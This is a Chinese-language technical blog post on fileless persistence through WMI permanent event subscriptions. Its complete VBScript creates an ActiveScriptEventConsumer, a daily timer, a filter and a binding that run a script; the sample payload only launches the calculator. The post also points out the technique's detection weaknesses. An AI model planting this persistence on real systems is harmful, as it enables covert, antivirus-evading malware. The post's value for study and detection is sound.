---
title: 利用WMI实现无文件攻击
author: St
categories:
- WMI
- St
tags: 
- WMI
- 无文件攻击 
date: 2020-01-22 
excerpt: 一种利用WMI来存储并定时执行的无文件攻击技术。 
---

# 前言

​	无文件攻击无需落地到目标的磁盘，因此反病毒引擎一般很难检测。WMI以本地和远程方式提供了许多管理功能，包括查询系统信息、启动和停止进程以及设置条件触发器。病毒可以利用WMI来存储并定时执行恶意代码，来实现无文件攻击。

# WMI简介

​	WMI是从Windows 2000起，在每个Windows系统版本中都会内置的一个管理框架。WMI以本地和远程方式提供了许多管理功能，包括查询系统信息、启动和停止进程以及设置条件触发器。我们可以使用各种工具（比如Windows的WMI命令行工具wmic.exe）或者脚本编程语言（如PowerShell）提供的API接口来访问WMI。Windows系统的WMI数据存储在WMI公共信息模型（common information model，CMI）仓库中，该仓库由“System32wbemRepository”文件夹中的多个文件组成。

​	WMI类是WMI的主要结构。WMI类中可以包含方法（代码）以及属性（数据）。具有系统权限的用户可以自定义类或扩展许多默认类的功能。

​	在满足特定条件时，我们可以使用WMI永久事件订阅（permanent event subscriptions）机制来触发特定操作。攻击者经常利用这个功能，在系统启动时执行后门程序，完成本地持久化。WMI的事件订阅包含三个核心WMI类：Filter（过滤器）类、Consumer（消费者）类以及FilterToConsumerBinding类。WMI Consumer用来指定要执行的具体操作，包括执行命令、运行脚本、添加日志条目或者发送邮件。WMI Filter用来定义触发Consumer的具体条件，包括系统启动、特定程序执行、特定时间间隔以及其他条件。FilterToConsumerBinding用来将Consumer与Filter关联在一起。创建一个WMI永久事件订阅需要系统的管理员权限。

# 实现过程

​	下面利用WMI中的永久时间消费者ActiveScriptEventConsumer，来实现无文件攻击。WMI中有许多这类的时间消费者，简单来说，当与其绑定的时间达到时，消费者就会被触发执行预先定义好的功能。

​	ASEC是WMI中的一个标准永久事件消费者，他的作用是当与其绑定的一个事件达到时，可以执行预先设定好的JS/VBS脚本。先来看下其原型：

```c++
class ActiveScriptEventConsumer : __EventConsumer
{
  uint8  CreatorSID[] = {1,1,0,0,0,0,0,5,18,0,0,0};//表示安全标识符（SID）的数组，该标识符唯一地标识活动脚本事件使用者的创建者。只读
  uint32 KillTimeout = 0;//允许脚本运行的事件，如果为0，则脚本不会终止。
  string MachineName;//WMI向其发送事件的计算机的名称。按照Microsoft标准使用者的约定，脚本使用者不能远程运行。第三方消费者也可以使用此属性。
  uint32 MaximumQueueSize;//活动脚本事件使用者的最大队列
  string Name;//用户自定义的事件消费者名称
  string ScriptingEngine;//用于解释脚本的脚本引擎，这里用的是VBScript
  string ScriptFileName;//想要从一个文件中读取执行脚本时，使用这个。
  string ScriptText;//存放执行的脚本代码，与ScriptFileName不可同时使用。
}
```

​	下面是一个绑定时间和ASEC的实例。

```vbscript
'配置时间消费者 用于指定要执行的具体操作
nslink="winmgmts:\\.\root\subscription:"	'设置ASEC所在的名称空间
SET asec=getobject(nslink&"ActiveScriptEventConsumer").spawninstance_
asec.name="test_consumer"	'自定义消费者名称
asec.scriptingengine="vbscript"	'用于解释脚本的脚本引擎
stxt="CreateObject(""Wscript.Shell"").Run ""calc"",3"	'脚本代码 这里会弹出一个计算器
asec.scripttext=stxt
SET asecpath=asec.put_
```

```vbscript
'配置计时器
SET itimer=getobject(nslink&"__IntervalTimerInstruction").spawninstance_
itimer.timerid="test_itimer"	'自定义计时器名称
runinterval = 86400000 
itimer.intervalbetweenevents=runinterval	'自定义脚本运行间隔 这里是一天运行一次。这里如果设置的时间过短 WMI会自动忽略
itimer.skipifpassed=false
itimer.put_
```

```vbscript
'配置事件过滤器 用于定义触发条件
SET evtflt=getobject(nslink&"__EventFilter").spawninstance_
evtflt.name="test_filter"	
evtflt.query="select * from __timerevent where timerid="""&"test_itimer"""	
evtflt.querylanguage="wql"	'使用WQL（WMI Query Language）语言查询事件是否触发
SET fltpath=evtflt.put_
```

```vbscript
'绑定消费者和过滤器
SET fcbnd=getobject(nslink&"__FilterToConsumerBinding").spawninstance_
fcbnd.consumer=asecpath.path
fcbnd.filter=fltpath.path
fcbnd.put_
```

​	将上述代码保存到vbs文件中运行，然后通过wmi查看工具来查询是否设置成功，这里用的工具是SimpleWMIView。

![](/pic/zhangtaiming/利用WMI实现无文件攻击/tool.png)

# 总结

​	之前著名的POSHSPY后门就是利用这一技术来实现的，他利用WMI实现后门的存储和本地持久化，不熟悉WMI的人难以发现其踪影。

​	不过，该技术依然存在弊端，脚本运行时，由系统自带的srcons.exe作为脚本宿主，这就会增加一个系统进程，虽然是系统正常的进程，不会被杀毒软件查杀，但还是太显眼了。并且，脚本运行结束后，该进程不会自动结束，必须让脚本借助WMI提供的Win32_Process对象主动终止宿主进程。

